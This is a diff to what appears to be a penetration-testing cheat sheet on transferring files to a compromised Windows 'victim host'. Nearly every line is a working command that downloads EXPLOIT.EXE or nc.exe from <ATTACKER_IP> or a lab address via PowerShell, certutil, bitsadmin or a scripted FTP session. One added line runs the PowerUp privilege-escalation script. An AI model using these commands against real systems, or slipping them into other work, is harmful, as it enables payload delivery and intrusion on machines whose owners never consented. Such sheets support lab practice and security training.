@@ -33,7 +33,11 @@ python -m SimpleHTTPServer 4444
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -c "(new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/EXPLOIT.EXE','C:\temp\EXPLOIT.EXE')"
 ```
 ```
-powershell.exe  -c "iwr -o EXPLOIT.EXE http://<ATTACKER_IP>/EXPLOIT.EXE"
+powershell.exe -c "iwr -OutFile EXPLOIT.EXE -Uri http://<ATTACKER_IP>/EXPLOIT.EXE"
+```
+* Execute `ps1` script:
+```
+powershell -c "Import-Module c:\TEMP\PowerUp.ps1;Invoke-AllChecks"
 ```
 
 * **Download** and **execute** a powershell script:
@@ -52,13 +56,15 @@ python -m pyftpdlib -p 21
 
 Windows has an FTP client built in to the PATH. You can open an FTP connection and download the files directly from Kali on the command line:
 ```
-C:\temp>echo open <ATTACKER_IP> >ftp_commands.txt  
-C:\temp>echo anonymous>>ftp_commands.txt  
-C:\temp>echo whatever>>ftp_commands.txt  
-C:\temp>echo binary>>ftp_commands.txt  
-C:\temp>echo get EXPLOIT.EXE>>ftp_commands.txt  
-C:\temp>echo bye>>ftp_commands.txt  
-C:\temp>ftp -v -s:ftp_commands.txt 
+echo open <ATTACKER_IP> 21>cmd.txt  
+echo anonymous>> cmd.txt 
+echo anonymous>> cmd.txt  
+echo bin >> cmd.txt  
+echo GET EXPLOIT.EXE >> cmd.txt  
+echo bye >> cmd.txt  
+```
+```
+ftp -v -s:cmd.txt 
 ```
 
 ## TFTP
@@ -185,7 +191,9 @@ certutil.exe -urlcache -f http://<ATTACKER_IP>/EXPLOIT.EXE EXPLOIT.EXE
 
 **On victim host**
 ```
-bitsadmin /transfer mydownloadjob /download /priority normal http://<ATTACKER_IP>/EXPLOIT.EXE C:\\Users\\%USERNAME%\\AppData\\local\\temp\\EXPLOIT.EXE
+bitsadmin /create 1 
+bitsadmin /addfile 1 http://10.10.14.12/nc.exe c:\TEMP\nc.exe 
+bitsadmin /RESUME 1 bitsadmin /complete 1
 ```
 
 # References
